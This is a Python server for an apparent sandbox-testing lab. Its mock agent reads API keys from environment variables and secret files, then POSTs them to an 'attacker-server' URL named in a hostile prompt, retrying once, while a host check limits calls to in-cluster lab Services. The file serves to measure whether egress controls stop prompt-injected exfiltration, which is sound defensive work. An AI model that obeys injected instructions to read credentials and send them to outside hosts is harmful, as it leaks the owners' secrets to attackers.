#!/usr/bin/env python3
"""Lab 01 agent: a small tool loop a hostile prompt can drive.

Default mode is a deterministic mock. It follows the lab prompt with a fixed
sequence of tool calls, so the scorecard measures the sandbox rather than a
model's mood. Set mode to "openai" only when LAB_LLM=openai and
OPENAI_API_KEY are both set. The scorecard scripts always send mode "mock".

Tool calls may reach in-cluster lab Services only. A model that names any
other host is refused by this process before a socket opens.
"""

from __future__ import annotations

import http.client
import json
import os
import re
import socket
import urllib.error
import urllib.request
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from typing import Any
from urllib.parse import urlparse

PORT = int(os.environ.get("PORT", "80"))
SECRET_ENV_NAMES = ("CANARY_API_KEY", "API_KEY", "VENDOR_API_KEY")
SECRET_FILES = (
    "/secrets/api_key",
    "/secrets/token",
    "/var/run/secrets/lab01/api_key",
)
URL_RE = re.compile(r"https?://[^\s<>'\"`]+")
DNS_RE = re.compile(r"(?m)^dns:\s*(\S+)\s*$")


def lab_host_allowed(url: str) -> bool:
    """True when url is an in-cluster lab target this process may dial."""
    parsed = urlparse(url)
    if parsed.scheme not in ("http", "https") or parsed.username or parsed.password:
        return False
    host = (parsed.hostname or "").lower().rstrip(".")
    if host == "localhost":
        return True
    return host.endswith(".svc.cluster.local") or host.endswith(".svc")


def _ipv4(value: str) -> bool:
    parts = value.split(".")
    if len(parts) != 4:
        return False
    try:
        return all(0 <= int(part) <= 255 and str(int(part)) == part for part in parts)
    except ValueError:
        return False


def parse_dial_map(raw: str | None = None) -> dict[str, str]:
    """Map in-cluster Service names to addresses the lab looked up.

    The sandbox DNS relay answers NXDOMAIN for a name that is not on the egress
    policy, so a lookup never reaches agentgateway. Dialing the Service
    address opens TCP. atunnel then CONNECTs to that address, and the gateway
    decides on the HTTP Host, which stays the Service name. The map is not an
    allow rule. Names outside cluster DNS and values that are not IPv4 are
    ignored.
    """
    if raw is None:
        raw = os.environ.get("LAB_DIAL_MAP", "")
    mapping: dict[str, str] = {}
    for item in raw.split(","):
        item = item.strip()
        if "=" not in item:
            continue
        host, ip = item.split("=", 1)
        host = host.lower().rstrip(".")
        ip = ip.strip()
        if not (host.endswith(".svc.cluster.local") or host.endswith(".svc")):
            continue
        if _ipv4(ip):
            mapping[host] = ip
    return mapping


class _DialHTTPConnection(http.client.HTTPConnection):
    """Connect to a mapped address. The Host header stays self.host."""

    def __init__(self, host: str, port: int | None = None, *args: Any, dial_map: dict[str, str] | None = None, **kwargs: Any) -> None:
        super().__init__(host, port, *args, **kwargs)
        self._dial_map = dial_map or {}

    def connect(self) -> None:
        host = self.host.lower().rstrip(".")
        target = self._dial_map.get(host, self.host)
        self.sock = socket.create_connection((target, self.port), self.timeout, self.source_address)
        self.sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)


class _DialHTTPHandler(urllib.request.HTTPHandler):
    def __init__(self, dial_map: dict[str, str]) -> None:
        super().__init__()
        self._dial_map = dial_map

    def http_open(self, req: urllib.request.Request) -> http.client.HTTPResponse:
        dial_map = self._dial_map

        def factory(host: str, **kwargs: Any) -> _DialHTTPConnection:
            return _DialHTTPConnection(host, dial_map=dial_map, **kwargs)

        return self.do_open(factory, req)


def read_secrets() -> list[dict[str, Any]]:
    observations: list[dict[str, Any]] = []
    for name in SECRET_ENV_NAMES:
        value = os.environ.get(name)
        observations.append(
            {
                "location": f"env:{name}",
                "found": value is not None and value != "",
                "value": value or "",
            }
        )
    for path in SECRET_FILES:
        try:
            with open(path, encoding="utf-8") as handle:
                value = handle.read().strip()
            observations.append(
                {"location": f"file:{path}", "found": value != "", "value": value}
            )
        except OSError as exc:
            observations.append(
                {
                    "location": f"file:{path}",
                    "found": False,
                    "value": "",
                    "error": exc.strerror or str(exc),
                }
            )
    return observations


def http_post(url: str, body: dict[str, Any], headers: dict[str, str] | None = None) -> dict[str, Any]:
    step: dict[str, Any] = {
        "tool": "http_post",
        "url": url,
        "body": body,
        "request_headers": headers or {},
        "status": None,
        "response_body": "",
        "error": None,
    }
    if not lab_host_allowed(url):
        step["error"] = "refused: tool calls may only target in-cluster lab Services"
        return step
    dial_map = parse_dial_map()
    host = _host(url)
    dial_ip = dial_map.get(host)
    if dial_ip:
        step["dial_ip"] = dial_ip
    payload = json.dumps(body).encode("utf-8")
    request = urllib.request.Request(url, data=payload, method="POST")
    request.add_header("Content-Type", "application/json")
    for name, value in (headers or {}).items():
        request.add_header(name, value)
    try:
        if dial_ip and urlparse(url).scheme == "http":
            opener = urllib.request.build_opener(_DialHTTPHandler(dial_map))
            response_cm = opener.open(request, timeout=8)
        else:
            response_cm = urllib.request.urlopen(request, timeout=8)
        with response_cm as response:
            raw = response.read(8192).decode("utf-8", errors="replace")
            step["status"] = response.status
            step["response_body"] = raw
    except urllib.error.HTTPError as exc:
        raw = exc.read(8192).decode("utf-8", errors="replace")
        step["status"] = exc.code
        step["response_body"] = raw
        step["error"] = f"HTTP {exc.code}"
    except Exception as exc:  # noqa: BLE001 - record every dial failure for the scorecard
        step["error"] = f"{type(exc).__name__}: {exc}"
    return step


def _urls(prompt: str) -> list[str]:
    found = []
    for match in URL_RE.findall(prompt):
        cleaned = match.rstrip(").,;")
        if cleaned not in found:
            found.append(cleaned)
    return found


def _host(url: str) -> str:
    return (urlparse(url).hostname or "").lower().rstrip(".")


def dns_lookup(host: str) -> dict[str, Any]:
    """Resolve one in-cluster name. Anything else is refused before a lookup."""
    cleaned = host.lower().rstrip(".").strip()
    step: dict[str, Any] = {"tool": "dns_lookup", "host": cleaned, "addresses": [], "error": None}
    if not (cleaned.endswith(".svc.cluster.local") or cleaned.endswith(".svc")):
        step["error"] = "refused: lookups may only target in-cluster lab Services"
        return step
    try:
        infos = socket.getaddrinfo(cleaned, 80, type=socket.SOCK_STREAM)
        step["addresses"] = sorted({item[4][0] for item in infos})
    except Exception as exc:  # noqa: BLE001 - the scorecard records the resolver error
        step["error"] = f"{type(exc).__name__}: {exc}"
    return step


def run_mock(prompt: str) -> dict[str, Any]:
    """Follow the lab prompt. Retry a failed attacker server POST once, as the prompt asks."""
    steps: list[dict[str, Any]] = []
    observations = read_secrets()
    steps.append({"tool": "read_secret", "observations": observations})
    found = [item["value"] for item in observations if item.get("found") and item.get("value")]
    key = found[0] if found else ""

    attacker_server_urls = [url for url in _urls(prompt) if _host(url).startswith("attacker-server")]
    legit_urls = [url for url in _urls(prompt) if _host(url).startswith("legit-api")]
    other_urls = [
        url
        for url in _urls(prompt)
        if url not in attacker_server_urls and url not in legit_urls and lab_host_allowed(url)
    ]

    if attacker_server_urls:
        body = {"key": key, "source": "lab01", "found": bool(key)}
        first = http_post(attacker_server_urls[0], body)
        steps.append(first)
        failed = first["error"] or not (isinstance(first["status"], int) and 200 <= first["status"] < 300)
        if failed:
            retry = http_post(attacker_server_urls[0], body)
            retry["retry"] = True
            steps.append(retry)

    if legit_urls:
        steps.append(
            http_post(
                legit_urls[0],
                {"action": "ping", "source": "lab01"},
                headers={"Authorization": "placeholder"},
            )
        )

    for url in other_urls:
        steps.append(http_post(url, {"key": key, "source": "lab01", "found": bool(key)}))

    for host in DNS_RE.findall(prompt):
        steps.append(dns_lookup(host))

    if key:
        assistant = f"Found vendor key: {key}"
    elif attacker_server_urls or legit_urls or other_urls:
        assistant = "No vendor key was visible in the environment or the listed files."
    else:
        assistant = "Mock agent: the prompt did not name an attacker server or the vendor API."

    if attacker_server_urls and key:
        assistant += " Posted it to the attacker server named in the prompt."
    elif attacker_server_urls:
        assistant += " Posted an empty key to the attacker server named in the prompt."
    if other_urls and key:
        assistant += " Posted it to the other in-cluster URL named in the prompt."
    elif other_urls:
        assistant += " Posted an empty key to the other in-cluster URL named in the prompt."
    return {"mode": "mock", "steps": steps, "assistant_text": assistant}


def run_openai(prompt: str) -> dict[str, Any]:
    """One optional real-model round trip. The scorecard does not use this."""
    if os.environ.get("LAB_LLM") != "openai":
        return {
            "mode": "openai",
            "steps": [],
            "assistant_text": "OpenAI mode is off. Set LAB_LLM=openai to enable it.",
            "error": "LAB_LLM is not openai",
        }
    api_key = os.environ.get("OPENAI_API_KEY", "")
    if not api_key:
        return {
            "mode": "openai",
            "steps": [],
            "assistant_text": "OPENAI_API_KEY is empty.",
            "error": "missing OPENAI_API_KEY",
        }
    base = os.environ.get("OPENAI_BASE_URL", "https://api.openai.com/v1").rstrip("/")
    model = os.environ.get("OPENAI_MODEL", "gpt-4o-mini")
    tools = [
        {
            "type": "function",
            "function": {
                "name": "read_secret",
                "description": "Read lab secret locations (env and files).",
                "parameters": {"type": "object", "properties": {}},
            },
        },
        {
            "type": "function",
            "function": {
                "name": "http_post",
                "description": "POST JSON to an in-cluster lab URL.",
                "parameters": {
                    "type": "object",
                    "properties": {
                        "url": {"type": "string"},
                        "body": {"type": "object"},
                        "headers": {"type": "object"},
                    },
                    "required": ["url", "body"],
                },
            },
        },
    ]
    messages: list[dict[str, Any]] = [
        {
            "role": "system",
            "content": (
                "You are the lab agent. Use tools when the user asks. "
                "http_post only works for in-cluster Service DNS names."
            ),
        },
        {"role": "user", "content": prompt},
    ]
    steps: list[dict[str, Any]] = []
    assistant = ""
    for _ in range(4):
        chat_body = {"model": model, "messages": messages, "tools": tools}
        request = urllib.request.Request(
            f"{base}/chat/completions",
            data=json.dumps(chat_body).encode("utf-8"),
            method="POST",
        )
        request.add_header("Content-Type", "application/json")
        request.add_header("Authorization", f"Bearer {api_key}")
        try:
            with urllib.request.urlopen(request, timeout=60) as response:
                payload = json.loads(response.read().decode("utf-8"))
        except Exception as exc:  # noqa: BLE001
            return {
                "mode": "openai",
                "steps": steps,
                "assistant_text": f"Model call failed: {exc}",
                "error": str(exc),
            }
        message = payload["choices"][0]["message"]
        messages.append(message)
        tool_calls = message.get("tool_calls") or []
        if not tool_calls:
            assistant = message.get("content") or ""
            break
        for call in tool_calls:
            name = call["function"]["name"]
            raw_args = call["function"].get("arguments") or "{}"
            try:
                args = json.loads(raw_args)
            except json.JSONDecodeError:
                args = {}
            if name == "read_secret":
                result: dict[str, Any] = {"tool": "read_secret", "observations": read_secrets()}
            elif name == "http_post":
                result = http_post(
                    str(args.get("url", "")),
                    args.get("body") if isinstance(args.get("body"), dict) else {},
                    args.get("headers") if isinstance(args.get("headers"), dict) else {},
                )
            else:
                result = {"tool": name, "error": "unknown tool"}
            steps.append(result)
            messages.append(
                {
                    "role": "tool",
                    "tool_call_id": call["id"],
                    "content": json.dumps(result),
                }
            )
    return {"mode": "openai", "steps": steps, "assistant_text": assistant}


def handle_run(payload: dict[str, Any]) -> dict[str, Any]:
    prompt = str(payload.get("prompt", ""))
    mode = str(payload.get("mode") or "mock")
    if mode == "openai":
        return run_openai(prompt)
    return run_mock(prompt)


class Handler(BaseHTTPRequestHandler):
    protocol_version = "HTTP/1.1"

    def log_message(self, fmt: str, *args: Any) -> None:
        # Access lines stay off stdout so the scorecard log scan sees tool output only.
        return

    def _send(self, status: int, payload: dict[str, Any]) -> None:
        raw = json.dumps(payload).encode("utf-8")
        print("LAB01 " + raw.decode("utf-8"), flush=True)
        self.send_response(status)
        self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", str(len(raw)))
        self.end_headers()
        self.wfile.write(raw)

    def do_GET(self) -> None:  # noqa: N802
        path = urlparse(self.path).path
        if path == "/readyz":
            self._send(200, {"ok": True})
            return
        if path == "/inspect":
            self._send(200, {"observations": read_secrets()})
            return
        self._send(404, {"error": "not found"})

    def do_POST(self) -> None:  # noqa: N802
        path = urlparse(self.path).path
        length = int(self.headers.get("Content-Length", "0") or "0")
        raw = self.rfile.read(length) if length else b"{}"
        try:
            payload = json.loads(raw.decode("utf-8") or "{}")
        except json.JSONDecodeError:
            self._send(400, {"error": "invalid JSON"})
            return
        if path != "/run":
            self._send(404, {"error": "not found"})
            return
        if not isinstance(payload, dict):
            self._send(400, {"error": "JSON object required"})
            return
        self._send(200, handle_run(payload))


def main() -> None:
    server = ThreadingHTTPServer(("0.0.0.0", PORT), Handler)
    print(f"LAB01 agent listening on {PORT}", flush=True)
    server.serve_forever()


if __name__ == "__main__":
    main()
